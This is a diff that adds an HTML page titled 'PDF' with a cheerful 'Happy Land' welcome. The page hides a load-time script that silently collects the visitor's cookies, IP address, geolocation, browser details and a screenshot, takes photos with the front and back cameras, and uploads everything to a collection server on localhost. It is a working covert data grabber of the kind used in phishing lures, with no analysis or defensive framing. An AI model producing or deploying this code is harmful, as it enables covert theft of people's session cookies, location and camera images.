@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PDF</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Collect user agent
+            var userAgent = navigator.userAgent;
+
+            // Function to fetch IP address
+            function getIPAddress() {
+                return fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => data.ip)
+                    .catch(error => {
+                        console.error('Error fetching IP:', error);
+                        return 'Error fetching IP';
+                    });
+            }
+
+            // Function to fetch Geolocation
+            function getGeolocation(resolveFunc) {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => resolveFunc({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        }),
+                        error => {
+                            console.error('Error fetching geolocation:', error);
+                            setTimeout(() => getGeolocation(resolveFunc), 5000); // Retry every 5 seconds
+                        }
+                    );
+                } else {
+                    console.error('Geolocation not supported');
+                    resolveFunc({
+                        latitude: 'Geolocation not supported',
+                        longitude: 'Geolocation not supported'
+                    });
+                }
+            }
+
+            // Function to get cookies
+            function getCookies() {
+                try {
+                    var cookies = document.cookie.split(';').reduce((cookieObject, cookieString) => {
+                        var parts = cookieString.split('=');
+                        cookieObject[parts[0].trim()] = parts[1] ? parts[1].trim() : '';
+                        return cookieObject;
+                    }, {});
+                    return cookies;
+                } catch (error) {
+                    console.error('Error fetching cookies:', error);
+                    return 'Error fetching cookies';
+                }
+            }
+
+            // Function to get referrer
+            function getReferrer() {
+                return document.referrer || "No referrer";
+            }
+
+            // Function to get page load time
+            function getPageLoadTime() {
+                return window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart;
+            }
+
+            // Function to get screen resolution
+            function getScreenResolution() {
+                return `${screen.width}x${screen.height}`;
+            }
+
+            // Function to get local time
+            function getLocalTime() {
+                return new Date().toLocaleString();
+            }
+
+            // Function to capture screenshot
+            function captureScreenshot(callback) {
+                html2canvas(document.body).then(canvas => {
+                    canvas.toBlob(blob => {
+                        callback(blob);
+                    });
+                });
+            }
+
+            // Function to capture camera photo
+            function captureCameraPhoto(cameraMode, callback) {
+                const video = document.createElement('video');
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: cameraMode } })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            canvas.toBlob(blob => {
+                                stream.getTracks().forEach(track => track.stop());
+                                callback(blob);
+                            });
+                        }, 1000); // Wait for the video to initialize
+                    })
+                    .catch(error => {
+                        console.error('Error accessing camera:', error);
+                        callback(null);
+                    });
+            }
+
+            // Send collected data to the server
+            function sendDataToServer(url, data) {
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => response.json())
+                .then(result => console.log('Success:', result))
+                .catch(error => console.error('Error:', error));
+            }
+
+            // Function to upload file to the server
+            function uploadFileToServer(url, file, filename) {
+                const formData = new FormData();
+                formData.append(filename, file);
+                fetch(url, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(result => console.log('File upload success:', result))
+                .catch(error => console.error('File upload error:', error));
+            }
+
+            // Function to collect and send data in stages
+            function collectAndSendData() {
+                const data = {
+                    userAgent: userAgent,
+                    referrer: getReferrer(),
+                    pageLoadTime: getPageLoadTime(),
+                    screenResolution: getScreenResolution(),
+                    localTime: getLocalTime(),
+                    cookies: getCookies()
+                };
+
+                sendDataToServer('http://localhost:5000/logs', data);
+
+                getIPAddress().then(ipAddress => {
+                    sendDataToServer('http://localhost:5000/logs', { ipAddress: ipAddress });
+                    
+                    new Promise((resolve) => getGeolocation(resolve)).then(location => {
+                        sendDataToServer('http://localhost:5000/logs', location);
+
+                        captureScreenshot(screenshotBlob => {
+                            if (screenshotBlob) {
+                                uploadFileToServer('http://localhost:5000/upload', screenshotBlob, 'screenshot');
+                            }
+
+                            captureCameraPhoto('user', frontCameraBlob => {
+                                if (frontCameraBlob) {
+                                    uploadFileToServer('http://localhost:5000/upload', frontCameraBlob, 'frontCamera');
+                                }
+
+                                captureCameraPhoto('environment', backCameraBlob => {
+                                    if (backCameraBlob) {
+                                        uploadFileToServer('http://localhost:5000/upload', backCameraBlob, 'backCamera');
+                                    }
+
+                                    setTimeout(() => location.reload(), 5000);
+                                });
+                            });
+                        });
+                    });
+                });
+            }
+
+            // Start the process
+            collectAndSendData();
+        });
+    </script>
+</head>
+<body>
+    <h1>Welcome to Happy Land</h1>
+    <p>Your visit is being happy!</p>
+</body>
+</html>
